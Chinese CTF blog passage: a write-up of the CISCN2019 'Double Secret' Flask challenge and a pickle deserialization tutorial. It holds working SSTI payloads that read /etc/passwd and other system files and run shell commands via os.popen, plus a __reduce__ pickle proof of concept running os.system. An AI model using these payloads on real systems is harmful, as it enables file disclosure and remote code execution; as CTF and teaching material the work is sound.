<h5 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h5><p>开题就<code>Welcome To Find Secret</code>，一番尝试后访问secret路由显示</p>
<p><code>Tell me your secret.I will encrypt it so others can&#39;t see</code></p>
<p>，尝试get请求&#x2F;secret?secret&#x3D;12324报错</p>
<p><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515113432443.png" alt="image-20240515113432443"></p>
<p>再输入secret&#x3D;1234，回显</p>
<p><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515113505672.png" alt="image-20240515113505672"></p>
<p>访问一下console路由，确实存在debug调试模式</p>
<p>现在在报错页面看看部分源码，看到如下</p>
<p><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515113700760.png" alt="image-20240515113700760"></p>
<p>应该存在ssti，看看附近代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line"> rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#解密</span></span><br><span class="line"> deS=rc.do_crypt(secret)</span><br><span class="line"> a=render_template_string(safe(deS)) </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"> <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>

<p>这里标记了一下解密，说明这里就是解密的过程，可以发现这里是rc4解密，结合刚进入这里的提示，会解密我传入的字符串，所以应该就是我传入的字符串需要rc4加密，并且这里可以知道密钥为<code>HereIsTreasure</code>，还可以看出这里有waf。</p>
<p>先给出大佬的rc4加密脚本,<a href="https://xz.aliyun.com/t/8092?time__1311=n4+xuDgDBADQYiKP40HwbDyiDcDjr2qGIKNUQYx&alichlgref=https://www.google.com.hk/#toc-5">文章</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;res用于加密字符串，加密后是：%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密后的字符串是: %s&quot;</span> %quote(cipher))</span><br><span class="line">    <span class="comment">#print(&quot;加密后的输出(经过编码):&quot;)</span></span><br><span class="line">    <span class="comment">#print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/proc/self/cgroup&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>或者直接使用赛博厨子也行（因为有不可见字符，所以加了 urlencode）</p>
<p><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515220803321.png" alt="image-20240515220803321"></p>
<p>这里有waf，应该改过滤了base等，这道题是python2，可以利用file类直接读文件，使用代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>不知道为什么app.py读不了</p>
<p>这里就可以得到<br><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515213503173.png" alt="image-20240515213503173"></p>
<p>用户名应该为glzjin，</p>
<p>随便输得到<code>/usr/local/lib/python2.7/site-packages/flask/app.py</code></p>
<p>再使用如下语句：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/sys/class/net/eth0/address&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>分别得到<code>be:3e:db:1a:cd:fa</code>即·209177173216762·</p>
<p>再获得机器码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/proc/self/cgroup&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>但是我这里环境可能有点问题，直接看<code>/etc/machine-id</code>和<code>/proc/sys/kernel/random/boot_i</code>也没有，而<code>/proc/self/cgroup</code>又没有，没办法。</p>
<p>这里主要是为了将python2与python3对比，但这里<a href="https://xz.aliyun.com/t/8092?time__1311=n4+xuDgDBADQYiKP40HwbDyiDcDjr2qGIKNUQYx&alichlgref=https://www.google.com.hk/#toc-5">有个文章</a>是用这个方法打出来的，<strong>就是需要注意那个app.py，得到后使用时需要改为<code>app.pyc</code>。</strong></p>
<p>这道题的可直接ssti得flag的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;nl /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515223545094.png" alt="image-20240515223545094"></p>
]]></content>
      <categories>
        <category>python</category>
        <category>debug pin码的利用</category>
      </categories>
  </entry>
  <entry>
    <title>pickle反序列化</title>
    <url>/2024/05/09/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h1><p>本篇文章用于简单入门，pickle反序列化危害性大，可以直接RCE</p>
<span id="more"></span>

<h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><h4 id="pickle简介"><a href="#pickle简介" class="headerlink" title="pickle简介"></a>pickle简介</h4><ul>
<li><strong>与PHP类似，python也有序列化功能以长期储存内存中的数据</strong>。<u>pickle是python下的序列化与反序列化包。</u></li>
<li>Python有另一个更原始的序列化包marshal，marshal存在主要是为了支持Python的<code>.pyc</code>文件,现在开发时一般使用pickle。</li>
<li>与json相比，pickle以二进制储存，不易于人工阅读；json可以跨语言，而pickle是python专用的。<strong>pickle能表示python几乎所有的类型（包括自定义类型）</strong>，json只能表示一部分内置类型且不能表示自定义类型。</li>
<li><strong>pickle实际上可以看作一种独立的语言，通过对opcode的更改编写可以执行python代码、覆盖变量等操作</strong>。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）</li>
</ul>
<p><em>目前，pickle有6种版本</em></p>
<h4 id="可序列化的对象"><a href="#可序列化的对象" class="headerlink" title="可序列化的对象"></a>可序列化的对象</h4><ul>
<li>None、True和False</li>
<li>整数、浮点数、复数</li>
<li>str、byte、bytearray</li>
<li>只包含可封存对象的集合，包括tuple、list、set和dict</li>
<li>定义在模块最外层的函数（使用def定义，lambda函数则不可以）</li>
<li>定义在模块最外层的内置函数</li>
<li>定义在模块最外层的类</li>
<li><code>__dict__</code> 属性值或 <code>__getstate__()</code> 函数的返回值可以被序列化的类</li>
</ul>
<h4 id="pickle模块部分说明"><a href="#pickle模块部分说明" class="headerlink" title="pickle模块部分说明"></a>pickle模块部分说明</h4><p>pickle模块常用的方法有：dumps、loads、dump、load</p>
<h5 id="pickle-dumps-obj"><a href="#pickle-dumps-obj" class="headerlink" title="pickle.dumps(obj)"></a>pickle.dumps(obj)</h5><ul>
<li><p><code>pickle.dumps()</code> 函数可以只接受两个参数：<strong>要序列化的对象和一个可选的 <code>protocol</code> 参数</strong>，<u>后者指定了 pickle 的协议版本,</u><code>pickle</code> 模块支持多个协议版本，<strong>从版本0到版本5</strong>。每个版本的协议都有不同的序列化格式，其中版本越高，序列化后的数据通常更为紧凑和高效。</p>
</li>
<li><p><strong>在 <code>pickle</code> 模块中，如果该项省略，则默认为0，<code>protocol</code> 参数如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。所以可以自定义版本，如下代码，不定义就是默认的</strong></p>
</li>
<li><p>含义：把obj对象序列化后以bytes对象返回，不写入文件</p>
</li>
</ul>
<p>例如如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">a=&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;bob&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;boy&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;pickle版本<span class="subst">&#123;i&#125;</span>&#x27;</span>,pickle.dumps(a,protocol=i))</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">pickle版本<span class="number">0</span> <span class="string">b&#x27;(dp0\nVname\np1\nVbob\np2\nsVsex\np3\nVboy\np4\ns.&#x27;</span></span><br><span class="line">pickle版本<span class="number">1</span> <span class="string">b&#x27;&#125;q\x00(X\x04\x00\x00\x00nameq\x01X\x03\x00\x00\x00bobq\x02X\x03\x00\x00\x00sexq\x03X\x03\x00\x00\x00boyq\x04u.&#x27;</span></span><br><span class="line">pickle版本<span class="number">2</span> <span class="string">b&#x27;\x80\x02&#125;q\x00(X\x04\x00\x00\x00nameq\x01X\x03\x00\x00\x00bobq\x02X\x03\x00\x00\x00sexq\x03X\x03\x00\x00\x00boyq\x04u.&#x27;</span></span><br><span class="line">pickle版本<span class="number">3</span> <span class="string">b&#x27;\x80\x03&#125;q\x00(X\x04\x00\x00\x00nameq\x01X\x03\x00\x00\x00bobq\x02X\x03\x00\x00\x00sexq\x03X\x03\x00\x00\x00boyq\x04u.&#x27;</span></span><br></pre></td></tr></table></figure>

<p>可以看出不同的pickle版本有序列化出来的值不同。</p>
<h5 id="pickle-loads-bytes-object"><a href="#pickle-loads-bytes-object" class="headerlink" title="pickle.loads(bytes_object)"></a>pickle.loads(bytes_object)</h5><p><strong>注意</strong>：Pickle 协议版本是自动检测出来的，所以不需要参数来指定协议。</p>
<p><strong>含义</strong>：从bytes对象中读取一个反序列化对象，并返回其重组后的对象且特殊情况下可以返回基本类型</p>
<p>如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">a=&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;bob&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;boy&#x27;</span>&#125;</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">d=pickle.loads(c)</span><br><span class="line"><span class="built_in">print</span>(d,<span class="built_in">type</span>(d))</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="string">b&#x27;\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x04name\x94\x8c\x03bob\x94\x8c\x03sex\x94\x8c\x03boy\x94u.&#x27;</span></span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;bob&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;boy&#x27;</span>&#125; &lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<h5 id="pickle-dump-obj-file"><a href="#pickle-dump-obj-file" class="headerlink" title="pickle.dump(obj,file)"></a>pickle.dump(obj,file)</h5><p><strong>含义</strong>：序列化对象，并将数据流写入到文件对象中</p>
<p>由于要写入到一个文件中，故至少有两个参数，同样可以自定义pickle版本。</p>
<p>注意：使用这个就需要调用open函数来调用一个文件对象，格式如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">a=&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;bob&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;boy&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./data.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f :</span><br><span class="line">    pickle.dump(a,f)</span><br></pre></td></tr></table></figure>

<p>序列化后后打开data.txt</p>
<p><img src="/2024/05/09/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240506174804669.png" alt="image-20240506174804669"></p>
<p>确实写入了不可读的数据</p>
<h5 id="pickle-load-file"><a href="#pickle-load-file" class="headerlink" title="pickle.load(file)"></a>pickle.load(file)</h5><p><strong>含义：</strong>反序列化对象，将文件中的数据解析为一个python对象</p>
<p><strong>注意</strong>：Pickle 协议版本是自动检测出来的，所以不需要参数来指定协议。</p>
<p>接上个板块，代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> b:</span><br><span class="line">    <span class="built_in">print</span>(pickle.load(b))</span><br><span class="line">输出：</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;bob&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;boy&#x27;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看出确实成功读出来了。</p>
<h2 id="pickle过程详细解读"><a href="#pickle过程详细解读" class="headerlink" title="pickle过程详细解读"></a>pickle过程详细解读</h2><ul>
<li>pickle解析依靠Pickle Virtual Machine(PVM)进行</li>
<li>PVM涉及到三个部分：1.解析引擎 2.栈 3.内存</li>
<li>解析引擎：从流中读取opcode和参数，并对其进行解释处理。重复这个动作，知道遇到<code>.</code>为止。最终留在栈顶的值将被作为反序列化对象返回。</li>
<li>栈：由Python的list实现，被用来临时存储数据、参数以及对象。</li>
<li>memo：有Python的dict实现，为PVM的生命周期提供存储。其实就是将反序列化后的数据以<code>key-balue</code>的形式储存在memo中，以便后来使用</li>
</ul>
<h2 id="opcode简介"><a href="#opcode简介" class="headerlink" title="opcode简介"></a>opcode简介</h2><h4 id="opcode版本"><a href="#opcode版本" class="headerlink" title="opcode版本"></a>opcode版本</h4><p>当对传入的数据进行过滤的时候就需要考虑用到opcode。</p>
<p>pickle由于有不同的实现版本，在Py3和py2中得到的opcode不相同。但是pickle可以向下兼容（所以用v0就可以在所有版本中执行）。目前，pickle有6种版本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">a=&#123;<span class="string">&#x27;1&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;# 原变量：<span class="subst">&#123;a!r&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;pickle版本<span class="subst">&#123;i&#125;</span>&#x27;</span>,pickle.dumps(a,protocol=i))</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line"><span class="comment"># 原变量：&#123;&#x27;1&#x27;: 1, &#x27;2&#x27;: 2&#125;</span></span><br><span class="line">pickle版本<span class="number">0</span> <span class="string">b&#x27;(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.&#x27;</span></span><br><span class="line">pickle版本<span class="number">1</span> <span class="string">b&#x27;&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br><span class="line">pickle版本<span class="number">2</span> <span class="string">b&#x27;\x80\x02&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br><span class="line">pickle版本<span class="number">3</span> <span class="string">b&#x27;\x80\x03&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br></pre></td></tr></table></figure>

<p>pickle3版本的opcode示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># &#x27;abcd&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\x80\x03X\x04\x00\x00\x00abcdq\x00.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># \x80：协议头声明 \x03：协议版本</span></span><br><span class="line"><span class="comment"># \x04\x00\x00\x00：数据长度：4</span></span><br><span class="line"><span class="comment"># abcd：数据</span></span><br><span class="line"><span class="comment"># q：储存栈顶的字符串长度：一个字节（即\x00）</span></span><br><span class="line"><span class="comment"># \x00：栈顶位置</span></span><br><span class="line"><span class="comment"># .：数据截止</span></span><br></pre></td></tr></table></figure>

<h4 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h4><p>使用pickletools可以方便的将opcode转化为便于肉眼读取的形式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">data=<span class="string">b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x04ls /\x94\x85\x94R\x94.&#x27;</span></span><br><span class="line">pickletools.dis(data)</span><br><span class="line"></span><br><span class="line">   <span class="number">0</span>: \x80 PROTO      <span class="number">4</span></span><br><span class="line">    <span class="number">2</span>: \x95 FRAME      <span class="number">28</span></span><br><span class="line">   <span class="number">11</span>: \x8c SHORT_BINUNICODE <span class="string">&#x27;nt&#x27;</span></span><br><span class="line">   <span class="number">15</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">0</span>)</span><br><span class="line">   <span class="number">16</span>: \x8c SHORT_BINUNICODE <span class="string">&#x27;system&#x27;</span></span><br><span class="line">   <span class="number">24</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">1</span>)</span><br><span class="line">   <span class="number">25</span>: \x93 STACK_GLOBAL</span><br><span class="line">   <span class="number">26</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">2</span>)</span><br><span class="line">   <span class="number">27</span>: \x8c SHORT_BINUNICODE <span class="string">&#x27;ls /&#x27;</span></span><br><span class="line">   <span class="number">33</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">3</span>)</span><br><span class="line">   <span class="number">34</span>: \x85 TUPLE1</span><br><span class="line">   <span class="number">35</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">4</span>)</span><br><span class="line">   <span class="number">36</span>: R    REDUCE</span><br><span class="line">   <span class="number">37</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">5</span>)</span><br><span class="line">   <span class="number">38</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="Unpickler-find-class-函数"><a href="#Unpickler-find-class-函数" class="headerlink" title="Unpickler.find_class()函数"></a><code>Unpickler.find_class()函数</code></h3><p>官方针对pickle的安全问题的建议是修改<code>find_class()</code>，引入白名单的方式来解决，很多CTF题都是针对该函数进行，所以搞清楚如何绕过该函数很重要。<br> <strong>什么时候会调用<code>find_class()</code>：</strong></p>
<ol>
<li>从opcode角度看，当出现<code>c</code>、<code>i</code>、<code>b&#39;\x93&#39;</code>时，会调用，所以只要在这三个opcode直接引入模块时没有违反规则即可。</li>
<li>从python代码来看，<code>find_class()</code>只会在解析opcode时调用一次，所以只要绕过opcode执行过程，<code>find_class()</code>就不会再调用，也就是说<code>find_class()</code>只需要过一次，通过之后再产生的函数在黑名单中也不会拦截，所以可以通过<code>__import__</code>绕过一些黑名单。</li>
</ol>
<p>看下面两个例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">safe_builtins = &#123;<span class="string">&#x27;range&#x27;</span>,<span class="string">&#x27;complex&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;frozenset&#x27;</span>,<span class="string">&#x27;slice&#x27;</span>,&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">in</span> safe_builtins:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %(module, name))</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&#x27;__main__&#x27;</span>: <span class="comment"># 只允许__main__模块</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br></pre></td></tr></table></figure>

<ul>
<li>第一个例子是官方文档中的例子，使用白名单限制了能够调用的模块为<code>&#123;&#39;range&#39;,&#39;complex&#39;,&#39;set&#39;,&#39;frozenset&#39;,&#39;slice&#39;,&#125;</code>。</li>
<li>第二个例子是高校战疫网络安全分享赛·webtmp中的过滤方法，只允许<code>__main__</code>模块。虽然看起来很安全，但是被引入主程序的模块都可以通过<code>__main__</code>调用修改，所以造成了变量覆盖。</li>
</ul>
<p>————————</p>
<h3 id="经典的-reduce-方法"><a href="#经典的-reduce-方法" class="headerlink" title="经典的__reduce__方法"></a><code>经典的__reduce__方法</code></h3><p>现在基本用不了，容易被ban。它的指令码是<code>R</code>。</p>
<ul>
<li>在利用时，可以通过重写类的<code>object.__reduce__()</code>函数，使之在被序列化时按照重写的方式进行。具体而言，python要求<code>object.__reduce__()</code> 返回一个 <code>(callable, ([para1,para2...])[,...])</code> 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。</li>
<li>在下文pickle的opcode中， <code>R</code> 的作用与 <code>object.__reduce__()</code> 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（<strong>第二个对象必须为元组</strong>,否则其他返回值也无法利用），然后调用该函数。</li>
</ul>
<p>所以一种很流行的攻击思路是：利用<code>__reduce__</code>构造恶意字符串，当这个字符串被反序列化的时候，<code>__reduce__</code>会被执行。</p>
<p><u><strong>总结</strong>这里<code>__reduce__</code>魔术方法的作用</u>：</p>
<p>其实上面描述已经比较清楚了，<strong>在Python中<code>__reduce__</code>方法是一个特殊的方法，用于控制对象的序列化和反序列化过程。</strong><u>当一个对象被序列化时，<code>pickle</code>模块会调用该对象的<code>__reduce__</code>方法，以获取一个描述如何反序列化该对象的元组</u>，同时，<strong>当对象被反序列化时，<code>pickle</code>模块会调用该元组中的可调用对象，并将其余元素作为参数传递给改可调用对象</strong>。</p>
<p>所以当我传入的按照我设置的格式进行pickle序列化后生成的字符串，在被反序列化时，它将按照我定义的<code>__reduce__</code>方法来反序列化；因此，重写<code>__reduce__</code>方法可以让我们控制对象在反序列化时的行为，并在CTF环境中执行任意代码。</p>
<p>——————</p>
<h3 id="简单的exp"><a href="#简单的exp" class="headerlink" title="简单的exp"></a>简单的exp</h3><p>漏洞利用简略思路：</p>
<ul>
<li>任意代码执行或命令执行。</li>
<li>变量覆盖，通过覆盖一些凭证达到绕过身份验证的目的</li>
</ul>
<p><strong>注意</strong>：pickle序列化的结果可能与从操作系统有关，使用windows构建的payload可能不能在linux上运行。</p>
<h5 id="命令执行："><a href="#命令执行：" class="headerlink" title="命令执行："></a>命令执行：</h5><h6 id="当环境有os模块时"><a href="#当环境有os模块时" class="headerlink" title="当环境有os模块时"></a>当环境有os模块时</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">genpoc</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;ls /&quot;&quot;&quot;</span>  <span class="comment"># 要执行的命令</span></span><br><span class="line">        <span class="keyword">return</span> os.system, (s,)        <span class="comment"># reduce函数必须返回元组或字符串</span></span><br><span class="line">        <span class="comment">#或者直接return os.system,(&quot;ls /&quot;,)</span></span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">poc = pickle.dumps(e)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(poc) <span class="comment"># 此时，如果 pickle.loads(poc)，就会执行命令</span></span><br></pre></td></tr></table></figure>

<p>成功执行：</p>
<p><img src="/2024/05/09/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240509003635408.png" alt="image-20240509003635408"></p>
<p><strong>稍微解析一下这串代码：</strong></p>
<ol>
<li>导入pickle、os模块</li>
